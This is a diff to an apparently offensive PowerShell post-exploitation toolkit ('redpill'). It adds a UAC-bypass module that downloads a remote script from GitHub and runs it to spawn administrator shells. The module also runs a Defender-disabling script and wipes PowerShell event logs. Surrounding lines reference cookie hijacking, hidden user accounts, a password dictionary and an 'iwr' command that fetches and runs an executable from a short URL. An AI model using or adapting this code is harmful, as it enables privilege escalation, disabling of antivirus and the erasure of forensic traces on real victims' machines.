@@ -90,6 +90,7 @@
    [string]$Dicionary="$Env:TMP\passwords.txt",
    [string]$Uri="$env:TMP\SpawnPowershell.cs",
    [string]$OutFile="$Env:TMP\Installer.exe",
+   [string]$Execute="$PsHome\powershell.exe",
    [string]$Domain="www.facebook.com",
    [string]$ServiceName="WinDefend",
    [string]$CookieHijack="False",
@@ -99,7 +100,8 @@
    [string]$ToIPaddr="false",
    [string]$DnsSpoof="false",
    [string]$IconSet="False",
-   [string]$Sponsor="false"
+   [string]$Sponsor="false",
+   [string]$UacMe="false"
 )
 
 
@@ -183,6 +185,7 @@ $ListParameters = @"
   -HiddenUser       Query|Create|Delete  Query \ Create \ Delete Hidden User Accounts
   -CsOnTheFly       https://../script.cs Download\Compile (to exe) and exec CS scripts
   -CookieHijack     Dump|History         Edge|Chrome browser Cookie Hijacking tool
+  -UacMe            Bypass|Clean         UAC bypass|EOP by dll reflection! (cmstp.exe)
 
 "@;
 echo $ListParameters > $Env:TMP\mytable.mt
@@ -2537,6 +2540,88 @@ If($CookieHijack -ne "False"){
 }
 
 
+
+If($UacMe -ne "false"){
+
+   <#
+   .SYNOPSIS
+      UAC bypass|EOP by dll reflection! (cmstp.exe)
+
+   .DESCRIPTION
+      User Account Control, commonly abbreviated UAC, is a Windows security component introduced
+      in Windows Vista and Windows Server 2008. UAC restricts processes access to admin level
+      resources and operations as much as possible, unless they are explicitly granted by the user.
+   
+   .NOTES   
+      This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass using native
+      PS [Reflection.Assembly]::Load() technic to load our dll and elevate privileges (user->admin)
+
+   .Parameter UacMe
+      Accepts arguments: Bypass OR Clean
+
+   .Parameter Execute
+      Accepts the command to be executed! (cmd|powershell)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -UacMe Bypass -Execute "cmd.exe"
+      Local spawns an cmd prompt with administrator privileges! 
+   
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -UacMe Bypass -Execute "powershell.exe"
+      Local spawns an powershell prompt with administrator privileges!   
+
+   .EXAMPLE
+      PS C:\> .\UacMe.ps1 -UacMe Bypass -Execute "powershell -file $Env:TMP\redpill.ps1"
+      Executes redpill.ps1 script trougth uac bypass module with elevated shell privs {admin}
+   
+   .EXAMPLE
+      PS C:\> .\UacMe.ps1 -UacMe Bypass -Execute "powershell -file $Env:TMP\DisableDefender.ps1 -Action Stop"
+      Executes DisableDefender.ps1 script trougth uac bypass module with elevated shell privs {admin}
+
+   .EXAMPLE
+      PS C:\> .\UacMe.ps1 -UacMe Clean
+      Deletes uac bypass artifacts and powershell eventvwr logs!
+      Remark: Admin privileges are required to delete PS logfiles.
+
+   .OUTPUTS
+      Privilege Name                Description                                   State
+      ============================= ============================================= ========
+      SeShutdownPrivilege           Encerrar o sistema                            Disabled
+      SeChangeNotifyPrivilege       Ignorar verificação transversal               Enabled
+      SeUndockPrivilege             Remover computador da estação de ancoragem    Disabled
+      SeIncreaseWorkingSetPrivilege Aumentar um conjunto de trabalho de processos Disabled
+      SeTimeZonePrivilege           Alterar o fuso horário                        Disabled
+
+      UAC State     : Enabled
+      UAC Settings  : Notify Me
+      ReflectionDll : C:\Users\pedro\AppData\Local\Temp\Trigger.dll
+      Execute       : powershell -file C:\Users\pedro\AppData\Local\Temp\redpill.ps1
+   #>
+
+   ## Download UacMe.ps1 from my GitHub
+   If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1")){## Download UacMe.ps1 from my GitHub repository
+      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1 -Destination $Env:TMP\UacMe.ps1 -ErrorAction SilentlyContinue|Out-Null
+      ## Check downloaded file integrity => FileSizeKBytes
+      $SizeDump = ((Get-Item -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue).length/1KB)
+      If($SizeDump -lt 16){## Corrupted download detected => DefaultFileSize: 16,19921875/KB
+         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
+         If(Test-Path -Path "$Env:TMP\UacMe.ps1"){Remove-Item -Path "$Env:TMP\UacMe.ps1" -Force}
+         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+      }   
+   }
+
+   ## Run auxiliary module
+   If($UacMe -ieq "Bypass"){
+      powershell -File "$Env:TMP\UacMe.ps1" -Action "$UacMe" -Execute "$Execute"
+   }ElseIf($UacMe -ieq "Clean"){
+      powershell -File "$Env:TMP\UacMe.ps1" -Action "$UacMe"
+   }
+
+   ## Clean Artifacts left behind
+   If(Test-Path -Path "$Env:TMP\UacMe.ps1"){Remove-Item -Path "$Env:TMP\UacMe.ps1" -Force}
+}
+
+
 ## --------------------------------------------------------------
 ##       HELP =>  * PARAMETERS DETAILED DESCRIPTION *
 ## --------------------------------------------------------------
@@ -4083,6 +4168,66 @@ $HelpParameters = @"
       Execute in attacker machine
       ---------------------------
       iwr -Uri shorturl.at/jryEQ -OutFile ChloniumUI.exe;.\ChloniumUI.exe
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "UacMe" -or $Help -ieq "Execute"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      UAC bypass|EOP by dll reflection! (cmstp.exe)
+
+   .DESCRIPTION
+      User Account Control, commonly abbreviated UAC, is a Windows security component introduced
+      in Windows Vista and Windows Server 2008. UAC restricts processes access to admin level
+      resources and operations as much as possible, unless they are explicitly granted by the user.
+   
+   .NOTES   
+      This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass using native
+      PS [Reflection.Assembly]::Load() technic to load our dll and elevate privileges (user->admin)
+
+   .Parameter UacMe
+      Accepts arguments: Bypass OR Clean
+
+   .Parameter Execute
+      Accepts the command to be executed! (cmd|powershell)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -UacMe Bypass -Execute "cmd.exe"
+      Local spawns an cmd prompt with administrator privileges! 
+   
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -UacMe Bypass -Execute "powershell.exe"
+      Local spawns an powershell prompt with administrator privileges!   
+
+   .EXAMPLE
+      PS C:\> .\UacMe.ps1 -UacMe Bypass -Execute "powershell -file `$Env:TMP\redpill.ps1"
+      Executes redpill.ps1 script trougth uac bypass module with elevated shell privs {admin}
+   
+   .EXAMPLE
+      PS C:\> .\UacMe.ps1 -UacMe Bypass -Execute "powershell -file `$Env:TMP\DisableDefender.ps1 -Action Stop"
+      Executes DisableDefender.ps1 script trougth uac bypass module with elevated shell privs {admin}
+
+   .EXAMPLE
+      PS C:\> .\UacMe.ps1 -UacMe Clean
+      Deletes uac bypass artifacts and powershell eventvwr logs!
+      Remark: Admin privileges are required to delete PS logfiles.
+
+   .OUTPUTS
+      Privilege Name                Description                                   State
+      ============================= ============================================= ========
+      SeShutdownPrivilege           Encerrar o sistema                            Disabled
+      SeChangeNotifyPrivilege       Ignorar verificação transversal               Enabled
+      SeUndockPrivilege             Remover computador da estação de ancoragem    Disabled
+      SeIncreaseWorkingSetPrivilege Aumentar um conjunto de trabalho de processos Disabled
+      SeTimeZonePrivilege           Alterar o fuso horário                        Disabled
+
+      UAC State     : Enabled
+      UAC Settings  : Notify Me
+      ReflectionDll : C:\Users\pedro\AppData\Local\Temp\Trigger.dll
+      Execute       : powershell -file C:\Users\pedro\AppData\Local\Temp\redpill.ps1
    #>!bye..
 
 "@;
